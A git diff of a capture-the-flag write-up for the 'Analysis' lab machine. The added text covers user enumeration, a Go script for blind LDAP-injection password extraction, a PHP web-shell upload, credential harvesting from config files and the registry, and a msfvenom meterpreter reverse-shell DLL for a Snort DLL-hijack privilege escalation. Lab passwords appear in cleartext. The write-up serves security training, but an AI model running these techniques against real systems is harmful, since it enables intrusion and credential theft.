@@ -380,7 +380,7 @@ print (output)
 
 `sudo nmap -sVC 10.10.11.3`
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 * obtained info
   * 53 DNS
@@ -423,7 +423,7 @@ print (output)
       * name: joomla\_db
       * **root:H0lOgrams4reTakIng0Ver754!**
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * OK, we obtained access to DB, but first we have to gain backend access...
 
@@ -448,7 +448,7 @@ cd dist
     * dlanor@office.htb
     * dmichael@office.htb
 
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -474,9 +474,9 @@ cd <folder>
 get GPT.INI
 ```
 
-<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -495,30 +495,366 @@ get GPT.INI
 
 * nothing much than the expected ones on Windows machine
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
 * page with no subpages, no text, no versions...
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### fuzzing
 
 * some subpages found, but all of them are 403 (forbidden access)
 * FFUF, DIRB
+* did it one more time, found a subdomain
+  * **internal**.analysis.htb
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 #### kerbrute
 
 * `./kerbrute_linux_amd64 userenum --dc analysis.htb -d analysis.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
 * some usernames found, could be useful for Weaponisation
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+* `nano usernames.txt`
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
+#### Internal fuzzing
+
+* there is a internal.analysis.htb subdomain, lets fuzz it
+  * `ffuf -w <wordlist> -u http"//internal.analysis.htb:80/FUZZ -mc 200,301,302`
+    * /users
+    * /dashboard
+    * /employees
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+* lets try to find another PHP files under subpages
+  * /users
+    * /list
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+* /dashboard
+  * /index
+  * /details
+  * /emergency
+  * /form
+  * /logout
+  * /tickets
+  * /upload
+* /employees
+  * /login
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+#### LDAP Injection
+
+* we cant really read the content of subpages (LFI), but we can try to make it work via LDAP injection...
+* What is it?
+  * LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in [SQL Injection](https://owasp.org/www-community/attacks/SQL\_Injection) can be similarly applied in LDAP Injection.
+* [http://internal.analysis.htb/users/list.php?name=\*](http://internal.analysis.htb/users/list.php?name=\*)
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+* OK, we obtained the username "technician"
+  * lets obtain his PW to login
+    * script for fuzzing LDAP description (PW)
+      * `go run script.go`
+
+```go
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+)
+
+func main() {
+	// Prompt user for wordlist input
+	fmt.Print("Enter the wordlist or charset (press Enter to use the default): ")
+	scanner := bufio.NewScanner(os.Stdin)
+	scanner.Scan()
+	charsetPath := strings.TrimSpace(scanner.Text())
+
+	// Use default wordlist if user didn't provide one
+	if charsetPath == "" {
+		charsetPath = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
+	}
+
+	baseURL := "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
+	foundChars := ""
+
+	file, err := os.Open(charsetPath)
+	if err != nil {
+		fmt.Println("Error opening charset file:", err)
+		return
+	}
+	defer file.Close()
+
+	scanner = bufio.NewScanner(file)
+	for scanner.Scan() {
+		char := strings.TrimSpace(scanner.Text())
+		//fmt.Println("Trying character:", char)
+		//thisisthat := "OnlyWorkingInput:"
+		
+		modifiedURL := strings.Replace(baseURL, "{FUZZ}", char, 1)
+		modifiedURL = strings.Replace(modifiedURL, "{found_char}", foundChars, 1)
+		fmt.Println("Modified URL:", modifiedURL)
+		//fmt.Println(thisisthat,"{found_char}",foundChars, 1)
+		
+		response, err := http.Get(modifiedURL)
+		if err != nil {
+			fmt.Println("Error making HTTP request:", err)
+			return
+		}
+		defer response.Body.Close()
+
+		body, err := ioutil.ReadAll(response.Body)
+		if err != nil {
+			fmt.Println("Error reading response body:", err)
+			return
+		}
+
+		if strings.Contains(response.Status, "200 OK") && strings.Contains(string(body), "technician") {
+			fmt.Println("Found character:", char)
+			foundChars += char
+			file.Seek(0, 0) // Move the file pointer to the beginning for another iteration
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading charset file:", err)
+		return
+	}
+
+	fmt.Println("Final found characters:", foundChars)
+}
+```
+
+* interation goes into loop because of \* char
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+* lets add the obtained string to the script and do the second iteration
+  * `baseURL := "http://internal.analysis.htb/users/list.php?name=`_`)(%26(objectClass=user)(description=97NTtl`_`{found_char}{FUZZ}*)"`
+* improved script.go:
+
+```go
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+)
+
+func main() {
+	// Prompt user for wordlist input
+	fmt.Print("Enter the wordlist or charset (press Enter to use the default): ")
+	scanner := bufio.NewScanner(os.Stdin)
+	scanner.Scan()
+	charsetPath := strings.TrimSpace(scanner.Text())
+
+	// Use default wordlist if user didn't provide one
+	if charsetPath == "" {
+		charsetPath = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
+	}
+
+	baseURL := "http://internal.analysis.htb/users/list.php?name=)(%26(objectClass=user)(description=97NTtl{found_char}{FUZZ}*)"
+	foundChars := ""
+
+	file, err := os.Open(charsetPath)
+	if err != nil {
+		fmt.Println("Error opening charset file:", err)
+		return
+	}
+	defer file.Close()
+
+	scanner = bufio.NewScanner(file)
+	for scanner.Scan() {
+		char := strings.TrimSpace(scanner.Text())
+		//fmt.Println("Trying character:", char)
+		//thisisthat := "OnlyWorkingInput:"
+		
+		modifiedURL := strings.Replace(baseURL, "{FUZZ}", char, 1)
+		modifiedURL = strings.Replace(modifiedURL, "{found_char}", foundChars, 1)
+		fmt.Println("Modified URL:", modifiedURL)
+		//fmt.Println(thisisthat,"{found_char}",foundChars, 1)
+		
+		response, err := http.Get(modifiedURL)
+		if err != nil {
+			fmt.Println("Error making HTTP request:", err)
+			return
+		}
+		defer response.Body.Close()
+
+		body, err := ioutil.ReadAll(response.Body)
+		if err != nil {
+			fmt.Println("Error reading response body:", err)
+			return
+		}
+
+		if strings.Contains(response.Status, "200 OK") && strings.Contains(string(body), "technician") {
+			fmt.Println("Found character:", char)
+			foundChars += char
+			file.Seek(0, 0) // Move the file pointer to the beginning for another iteration
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading charset file:", err)
+		return
+	}
+
+	fmt.Println("Final found characters:", foundChars)
+}
+```
+
+* it finds our PW
+  * **`97NTtl*4QP96Bv`**
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+* Lets check if it is correct...
+  * nano PW.txt
+    * **`97NTtl*4QP96Bv`**
+  * `./kerbrute_linux_amd64 bruteuser --dc analysis.htb -d analysis.htb PW.txt technician`
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+*   Login into
+
+    * technician@analysis.htb:97NTtl\*4QP96Bv
+
+    <figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
 ### Exploitation
+
+#### Finding the Vector
+
+* Tickets -> two unresolved issues
+  * AD login issue via kerberos auth
+  * failing to execute HTA files
+* SOC Report
+  * files can be uploaded
+* Emergency
+  * we can send data through notification form&#x20;
+
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+#### Crafting php RS
+
+* P0wnyshell
+  * copy shell.php content
+  * nano shell.php
+    * upload it & go to /dashboard/uploads/shell.php
+
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+* cd C:\inetpub\internal\users
+* type list.php
+  * we obtained:
+    * $ldap\_password = 'N1G6G46G@G!j';
+    * $ldap\_username = 'webservice@analysis.htb';
+    * $ldap\_connection = ldap\_connect("analysis.htb");
+
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+* cd C:\inetpub\internal\employees
+* type login.php
+  * we obtained:
+    * $host = "localhost";&#x20;
+    * $username = "db\_master";&#x20;
+    * $password = '0$TBO7H8s12yh&';&#x20;
+    * $database = "employees";
+
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
+#### jdoe password
+
+* cd C:\Windows\temp
+* `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
+  * **jdoe:7y4Z4^\*y9Zzj**
+
+<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+#### evil-winrm login
+
+* `evil-winrm -i 10.10.11.250 -u jdoe -p 7y4Z4^*y9Zzj`
+
+<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+* `cd ..`
+* `cd Desktop`
+* `type user.txt`
+
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
 ### Root flag
+
+#### Snort
+
+* There is a SW called Snort
+  * Snort is the foremost Open Source Intrusion Prevention System (IPS) in the world. Snort IPS uses a series of rules that help define malicious network activity and uses those rules to find packets that match against them and generates alerts for users.
+  * Snort can be deployed inline to stop these packets, as well. Snort has three primary uses: As a packet sniffer like tcpdump, as a packet logger — which is useful for network traffic debugging, or it can be used as a full-blown network intrusion prevention system. Snort can be downloaded and configured for personal and business use alike.
+    * it has a vuln
+      * we can hijack it for PE
+        * &#x20;reference: [https://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt](https://hyp3rlinx.altervista.org/advisories/SNORT-DLL-HIJACK.txt)
+
+<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+* `icacls snort_dynamicpreprocessor`
+
+<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+#### Create a malicious .dll file
+
+* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f dll -o sf_engine.dll`
+  * we crafted malicious **sf\_engine.dll** file
+
+<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+* msfconsole -q
+  * search multi handler
+  * use 5
+  * options
+  * set LHOST tun0
+  * set LPORT 9001
+  * run -j
+
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+* Evil-winRM
+  * cd snort\_dynamicpreprocessor
+  * upload sf\_engine.dll
+
+<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+* The next step is to start snort, so I've create an empty pcap-file in C:\private this might raise an error but as long the file exists it is fine. Could be possible to start snort without a file as well
+  * cd private
+  * type nul > test.pcap
+
+<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+* now we should obtain the ADMIN shell in our msfconsole
+  * DOESNT WORK ALREADY - WAS PROBABLY PATCHED
